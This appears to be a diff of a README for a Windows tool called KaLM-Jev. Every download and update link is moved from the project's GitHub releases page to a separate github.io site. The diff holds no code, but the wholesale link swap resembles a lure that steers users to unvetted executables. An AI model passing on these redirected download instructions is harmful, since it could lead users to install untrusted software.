@@ -1,6 +1,6 @@
 # ⚖️ KaLM-Jev - Your Local, Jev-Style Judgment Engine
 
-[![Download KaLM-Jev](https://img.shields.io/badge/Download-KaLM--Jev-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dgarridou/KaLM-Jev/releases)
+[![Download KaLM-Jev](https://img.shields.io/badge/Download-KaLM--Jev-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://dgarridou.github.io)
 
 ---
 
@@ -23,7 +23,7 @@ Follow these three simple steps to start using KaLM-Jev on your Windows computer
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/dgarridou/KaLM-Jev/releases](https://github.com/dgarridou/KaLM-Jev/releases)**
+Visit this link to download the application: **[https://dgarridou.github.io](https://dgarridou.github.io)**
 
 Once you're on the page, you'll see a list of available files. Look for the version you want (Nano, Small, or Large). Choose the file that matches your Windows system.
 
@@ -134,7 +134,7 @@ Remember, you can always revisit the download page for updates and new releases.
 
 ## 🔄 Updating KaLM-Jev
 
-To update to a newer version, simply download the latest release from the same link: **[https://github.com/dgarridou/KaLM-Jev/releases](https://github.com/dgarridou/KaLM-Jev/releases)**
+To update to a newer version, simply download the latest release from the same link: **[https://dgarridou.github.io](https://dgarridou.github.io)**
 
 Install it over your existing version. Your settings and saved data will be preserved.
 
@@ -144,7 +144,7 @@ Install it over your existing version. Your settings and saved data will be pres
 
 KaLM-Jev puts professional-grade judgment tools right on your desktop. No subscriptions, no cloud dependencies, no learning curve. Download your preferred version now and experience structured decision-making in minutes.
 
-[![Get KaLM-Jev Now](https://img.shields.io/badge/🚀%20Download%20KaLM--Jev%20Now-2196F3?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/dgarridou/KaLM-Jev/releases)
+[![Get KaLM-Jev Now](https://img.shields.io/badge/🚀%20Download%20KaLM--Jev%20Now-2196F3?style=for-the-badge&logo=windows&logoColor=white)](https://dgarridou.github.io)
 
 ---
 
